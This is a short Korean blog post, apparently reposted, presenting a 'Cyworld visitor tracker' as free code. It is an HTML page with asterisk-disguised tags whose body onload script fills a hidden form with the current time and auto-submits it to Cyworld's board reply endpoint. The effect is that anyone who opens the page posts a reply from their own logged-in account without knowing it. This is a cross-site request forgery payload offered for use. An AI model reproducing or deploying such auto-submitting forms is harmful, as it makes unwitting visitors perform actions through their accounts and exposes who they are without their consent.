cy
==

cy

<*html>
<*head>
<*script>
*function timeVal() {
*var time = new Date()
*var yy = time.getYear()
*var mm = time.getMonth() + 1
*var dd = time.getDate()
*var hour = time.getHours()
*var minute = time.getMinutes()
*var second = time.getSeconds()
*var pos_val = " " 

*pos_val += yy + " 년" + mm + "월 " + dd + "일" + " " + ((hour > 12) ? (hour - 12) : hour)
*pos_val += ((minute < 10) ? ":0" : ":") + minute
*pos_val += ((second < 10) ? ":0" : ":") + second
*pos_val += (hour >= 12) ? " PM" : " AM"
*return pos_val;
}
</*script> 
</*head>
<*body onload="javascript<x>:document.form1.content.value=timeVal();document.form1.submit()"> </x>
<*form method=post action="http://minihp.cyworld.nate.com/pims/board/general/board_replyok.asp" id=form1 name=form1>
<*input type=hidden name=tid value="싸이 번호">
<*input type=hidden name=board_no value="게시판번호">
<*input type=hidden name=item_seq value="글번호">
<*input type=hidden name=cpage value="1">
<*input type=hidden name="search_type" value="">
<*input type=hidden name="search_keyword" value="">
<*input type=hidden name="domain" value="">
<*input type=hidden name="breply" value="0">
<*input type=hidden name="review_seq" value="">
<*input type="text" name="content" style="width:200px;"class="input2" value="">
</*form> 
</*body>
</*html>
[출처] 싸이월드 방문자 추적 및 기록 남기기 /구매하지마세요|작성자 호안이호종
